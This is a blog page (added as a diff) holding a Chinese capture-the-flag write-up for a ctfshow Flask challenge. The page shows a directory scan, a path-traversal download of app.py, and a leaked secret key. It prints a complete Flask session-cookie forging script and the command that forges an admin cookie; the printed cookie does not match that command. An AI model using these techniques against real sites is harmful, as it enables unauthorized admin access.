@@ -1,0 +1,413 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>ctfshow 菜狗杯 抽老婆 wp | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>ctfshow 菜狗杯 抽老婆 wp</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2022/11/29
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/python/" style="color: #00a596">python</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/flask/" style="color: #ffa2c4">flask</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #00a596">后端</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>启动环境<img src="https://img-blog.csdnimg.cn/94ca836b9f26477d91337d91e674e590.png" alt="在这里插入图片描述"><br>dirsearch开扫<br>扫到&#x2F;console<br>进入该目录<br><img src="https://img-blog.csdnimg.cn/8c40cc566bf04580a7f20e9eb93a8d71.png" alt="在这里插入图片描述"><br>尝试弱口令爆破<br>失败,<br>那么抓个返回的包看看<br><img src="https://img-blog.csdnimg.cn/e731a4571bde491592fd0d56cb5840bd.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6b9f26f13588403b996666e81d3b878a.png" alt="在这里插入图片描述"><br>全改true<br><img src="https://img-blog.csdnimg.cn/6a19bdc823d54cddac7561b9327ebf38.png" alt="在这里插入图片描述"><br>此时控制台可用了<br>尝试通过python的os.system方法执行系统命令<img src="https://img-blog.csdnimg.cn/0170af8766494ad6ae1cf4ada80c68b8.png" alt="在这里插入图片描述"><br>到这发现应该是思路错了<br>考虑到存在文件下载的功能,尝试下载源文件<br>最终<code>../../app.py</code>下载成功<br><img src="https://img-blog.csdnimg.cn/6d36879c97804dcbac2d887b243e2038.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ea0448577a034c13b77aa9d8e285bf31.png" alt="在这里插入图片描述"><br>尝试访问该路径<br>需要验证session<br>尝试jwt解码<br><img src="https://img-blog.csdnimg.cn/4efb1345669e46d08062321b7826fa39.png" alt="在这里插入图片描述">由源码知此处isadmin的值为true就可以了<br>下面用到一个处理session的脚本来构造</p>
+<pre><code class="php">
+#!/usr/bin/env python3
+&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;
+__author__ = &#39;Wilson Sumanang, Alexandre ZANNI&#39;
+ 
+# standard imports
+import sys
+import zlib
+from itsdangerous import base64_decode
+import ast
+ 
+# Abstract Base Classes (PEP 3119)
+if sys.version_info[0] &lt; 3: # &lt; 3.0
+    raise Exception(&#39;Must be using at least Python 3&#39;)
+elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4
+    from abc import ABCMeta, abstractmethod
+else: # &gt; 3.4
+    from abc import ABC, abstractmethod
+ 
+# Lib for argument parsing
+import argparse
+ 
+# external Imports
+from flask.sessions import SecureCookieSessionInterface
+ 
+class MockApp(object):
+ 
+    def __init__(self, secret_key):
+        self.secret_key = secret_key
+ 
+ 
+if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4
+    class FSCM(metaclass=ABCMeta):
+        def encode(secret_key, session_cookie_structure):
+            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;
+            try:
+                app = MockApp(secret_key)
+ 
+                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
+                si = SecureCookieSessionInterface()
+                s = si.get_signing_serializer(app)
+ 
+                return s.dumps(session_cookie_structure)
+            except Exception as e:
+                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)
+                raise e
+ 
+ 
+        def decode(session_cookie_value, secret_key=None):
+            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;
+            try:
+                if(secret_key==None):
+                    compressed = False
+                    payload = session_cookie_value
+ 
+                    if payload.startswith(&#39;.&#39;):
+                        compressed = True
+                        payload = payload[1:]
+ 
+                    data = payload.split(&quot;.&quot;)[0]
+ 
+                    data = base64_decode(data)
+                    if compressed:
+                        data = zlib.decompress(data)
+ 
+                    return data
+                else:
+                    app = MockApp(secret_key)
+ 
+                    si = SecureCookieSessionInterface()
+                    s = si.get_signing_serializer(app)
+ 
+                    return s.loads(session_cookie_value)
+            except Exception as e:
+                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)
+                raise e
+else: # &gt; 3.4
+    class FSCM(ABC):
+        def encode(secret_key, session_cookie_structure):
+            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;
+            try:
+                app = MockApp(secret_key)
+ 
+                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
+                si = SecureCookieSessionInterface()
+                s = si.get_signing_serializer(app)
+ 
+                return s.dumps(session_cookie_structure)
+            except Exception as e:
+                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)
+                raise e
+ 
+ 
+        def decode(session_cookie_value, secret_key=None):
+            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;
+            try:
+                if(secret_key==None):
+                    compressed = False
+                    payload = session_cookie_value
+ 
+                    if payload.startswith(&#39;.&#39;):
+                        compressed = True
+                        payload = payload[1:]
+ 
+                    data = payload.split(&quot;.&quot;)[0]
+ 
+                    data = base64_decode(data)
+                    if compressed:
+                        data = zlib.decompress(data)
+ 
+                    return data
+                else:
+                    app = MockApp(secret_key)
+ 
+                    si = SecureCookieSessionInterface()
+                    s = si.get_signing_serializer(app)
+ 
+                    return s.loads(session_cookie_value)
+            except Exception as e:
+                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)
+                raise e
+ 
+ 
+if __name__ == &quot;__main__&quot;:
+    # Args are only relevant for __main__ usage
+    
+    ## Description for help
+    parser = argparse.ArgumentParser(
+                description=&#39;Flask Session Cookie Decoder/Encoder&#39;,
+                epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)
+ 
+    ## prepare sub commands
+    subparsers = parser.add_subparsers(help=&#39;sub-command help&#39;, dest=&#39;subcommand&#39;)
+ 
+    ## create the parser for the encode command
+    parser_encode = subparsers.add_parser(&#39;encode&#39;, help=&#39;encode&#39;)
+    parser_encode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,
+                                help=&#39;Secret key&#39;, required=True)
+    parser_encode.add_argument(&#39;-t&#39;, &#39;--cookie-structure&#39;, metavar=&#39;&lt;string&gt;&#39;,
+                                help=&#39;Session cookie structure&#39;, required=True)
+ 
+    ## create the parser for the decode command
+    parser_decode = subparsers.add_parser(&#39;decode&#39;, help=&#39;decode&#39;)
+    parser_decode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,
+                                help=&#39;Secret key&#39;, required=False)
+    parser_decode.add_argument(&#39;-c&#39;, &#39;--cookie-value&#39;, metavar=&#39;&lt;string&gt;&#39;,
+                                help=&#39;Session cookie value&#39;, required=True)
+ 
+    ## get args
+    args = parser.parse_args()
+ 
+    ## find the option chosen
+    if(args.subcommand == &#39;encode&#39;):
+        if(args.secret_key is not None and args.cookie_structure is not None):
+            print(FSCM.encode(args.secret_key, args.cookie_structure))
+    elif(args.subcommand == &#39;decode&#39;):
+        if(args.secret_key is not None and args.cookie_value is not None):
+            print(FSCM.decode(args.cookie_value,args.secret_key))
+        elif(args.cookie_value is not None):
+            print(FSCM.decode(args.cookie_value))
+</code></pre>
+<p>使用方法可以参考<br><a target="_blank" rel="noopener" href="https://gitcode.net/mirrors/noraj/flask-session-cookie-manager?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/noraj/flask-session-cookie-manager?utm_source&#x3D;csdn_github_accelerator</a><br><img src="https://img-blog.csdnimg.cn/5b9d6f42f41a4f698103a259c97c9014.png" alt="在这里插入图片描述"><br>观察到secret_key&#x3D;tanji_is_A_boy_Yooooooooooooooooooooo!<br>执行脚本</p>
+<pre><code class="php">python flask_session_cookie_manager3.py encode -s &quot;tanji_is_A_boy_Yooooooooooooooooooooo!&quot; -t &quot;&#123;&#39;current_wifi&#39;: &#39;5182cd0da9eecd039a546093143b2bf1.jpg&#39;, &#39;isadmin&#39;: True&#125;&quot;
+</code></pre>
+<p>得到<br>eyJjdXJyZW50X3dpZmkiOiI1MTgyY2QwZGE5ZWVjZDAzOWE1NDYwOTMxNDNiMmJmMS5qcGciLCJpc2FkbWluIjpmYWxzZX0.Y3EP0g.Op7cFx6rEjOoyz_I6nGYCBvrtuE<br>重放数据包<br>得到flag</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
